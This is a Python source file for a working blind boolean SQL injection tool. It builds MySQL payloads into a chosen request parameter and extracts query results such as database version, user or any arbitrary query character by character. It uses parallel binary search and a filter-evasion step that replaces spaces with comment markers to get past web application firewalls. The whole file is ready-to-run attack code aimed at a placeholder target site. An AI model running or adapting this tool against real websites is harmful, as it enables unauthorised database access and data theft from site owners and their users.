#!/usr/bin/python3

'''
- By Mukarram Khalid
- https://github.com/mukarramkhalid
- https://mukarramkhalid.com
- https://www.linkedin.com/in/mukarramkhalid
'''

import sys, json, secrets, readline
from multiprocessing import Pool, Manager
from functools import partial
try:
    import requests
    requests.packages.urllib3.disable_warnings()
except:
    exit('[-] Failed to load requests module')

class HTTP():
    ''' HTTP class '''

    verbosity = False
    url = None
    parameters = None
    timeout = 5
    method = 'GET'
    headers = {
        'User-Agent': 'Mozilla/5.0'
    }
    proxies = {
        'http': 'http://127.0.0.1:8080',
        'https': 'https://127.0.0.1:8080',
    }

    def __init__(self, url, parameters):
        self.url = url
        self.parameters = parameters
        self.session = requests.session()
        self.session.headers = self.headers

    def get(self, payload):
        return self.session.get(self.url, params = payload, headers = self.headers, timeout = self.timeout, verify = False, allow_redirects = False, proxies = self.proxies)

    def post(self, payload):
        return self.session.post(self.url, data = payload, headers = self.headers, timeout = self.timeout, verify = False, allow_redirects = False, proxies = self.proxies)

    def request(self, payload):
        if self.method == 'POST':
            return self.post(payload)
        return self.get(payload)

class Injector():
    ''' Injector Class '''

    '''
    Change payloads if required. Some example payloads are given below
    payload = "1'and if(substring(%s,%i,1)between(0x%x)and(0x%x),1,(select table_name from information_schema.tables))and''='"
    payload_length = "1'and if(length(%s)between(%i)and(%i),1,(select table_name from information_schema.tables))and''='"
    '''
    payload = "1')or if(BINARY substring((%s),%i,1)between(0x%x)and(0x%x),1,0)#"
    payload_length = "1')or if(length((%s))between(%i)and(%i),1,0)#"
    verbosity = False
    injectible = None
    http = None

    def __init__(self, url, parameters):
        self.http = HTTP(url, parameters)
        self.setInjectible()

    def setInjectible(self):
        self.injectible = {v : k for k, v in self.http.parameters.items()}['__PAYLOAD__']

    def wafBypass(self, payload):
        '''
        This is the final payload which gets injected
        You can replace keywords or modify the payload with search/replace to bypass some WAF
        For example, I'm replacing all spaces in the final payload with /**/
        '''
        return payload.replace(' ', '/**/')

    def makePayload(self, position, start, pointer, lengthOnly = False):
        payload = self.http.parameters
        if lengthOnly:
            payload[self.injectible] = self.wafBypass(self.payload_length % (self.query, start, pointer))
        else:
            payload[self.injectible] = self.wafBypass(self.payload % (self.query, position, start, pointer))
        return payload

    def infer(self, response):
        '''
        This method infers True/False results
        You can use the response object to define your own True/False checks
        '''
        if len(response.content) < 50:
            return False
        return True

    def characterAt(self, output = None, position = None, lengthOnly = None):
        start = 0
        end = 255
        if lengthOnly:
            end = 2000
        pointer = 0
        while not (start == end == pointer):
            pointer = start + int((end - start) / 2)
            if (start == end == pointer):
                if lengthOnly:
                    return pointer
                output[position] = chr(pointer)
                return self.print(output)
            r = self.http.request(self.makePayload(position, start, pointer, lengthOnly))
            if self.infer(r):
                end = pointer
            else:
                start = pointer + 1
        if lengthOnly:
            return pointer
        output[position] = chr(pointer)
        return self.print(output)

    def length(self):
        return self.characterAt(None, 0, True)

    def print(self, output):
        sys.stdout.flush()
        print("\r", end = '')
        print(''.join(dict(sorted(output.items())).values()), end = '')
        sys.stdout.flush()

    def inject(self, query):
        self.query = query
        print('[+] Finding query length')
        length = self.length()
        print('[+] Query length : %i' % length)
        with Manager() as manager:
            output = manager.dict()
            method = partial(self.characterAt, output)
            with Pool(8) as pool:
                pool.map(method, list(range(1, length + 1)))
            print("\n")
            return

def main():
    url = 'http://somesite.com/index_public.php'
    parameters = {
        'q' : '__PAYLOAD__',
        'other' : 'parameters'
    }
    injector = Injector(url, parameters)
    queries = ['version()', 'user()', 'database()']
    while True:
        query = input('[+] Query [Example: %s]: ' % secrets.choice(queries))
        injector.inject(query)

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print('[-] CTRL-C Detected')
